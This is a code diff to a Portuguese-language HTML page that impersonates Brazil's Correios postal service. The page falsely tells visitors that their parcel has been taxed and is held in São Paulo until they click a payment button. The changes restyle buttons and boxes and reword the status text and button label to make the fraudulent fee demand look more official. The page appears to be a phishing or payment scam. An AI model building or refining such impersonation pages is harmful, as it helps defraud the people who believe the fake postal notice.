@@ -227,6 +227,7 @@
       border-radius: 8px;
       padding: 2rem;
       font-family: Arial, sans-serif;
+      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
       text-align: center;
       max-width: 700px;
       margin: 2rem auto;
@@ -293,7 +294,7 @@
     /* Botão sim sou eu */
     #btn-sim-sou-eu, #btn-pagar {
       margin-top: 1.5rem;
-      padding: 0.4rem 1.5rem;
+      padding: 0.6rem 1.5rem;
       font-size: 1.1rem;
       background-color: #007bff;
       color: white;
@@ -304,7 +305,6 @@
       display: inline-block;
       max-width: 600px;
       width: 100%;
-      font-weight: normal;
     }
 
     #btn-sim-sou-eu:hover, #btn-pagar:hover {
@@ -461,14 +461,15 @@
       
       <div class="alert-title">❗ SUA ENCOMENDA FOI TRIBUTADA!</div>
       
-      <div class="status-label">🟡 AGUARDANDO SUA CONFIRMAÇÃO</div>
+      <div class="status-label">STATUS DA ENTREGA:</div>
+      <div class="status-value">AGUARDANDO SUA CONFIRMAÇÃO</div>
       
-      <p style="color: #007bff;">Sua encomenda está retida na agência dos Correios em São Paulo</p>
+      <p class="normal-text">Sua encomenda está retida na agência dos Correios em São Paulo</p>
       
       <p class="normal-text">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
       
       <div class="btn-container">
-        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+        <button id="btn-pagar">Efetuar Pagamento</button>
         <p>Objeto aguardando sua confirmação</p>
         <p>em Unidade de Fiscalização em São Paulo</p>
         <p>Objeto em transferência - por favor aguarde</p>
@@ -651,4 +652,4 @@
   </script>
 </body>
 
-</html>
+</html> 
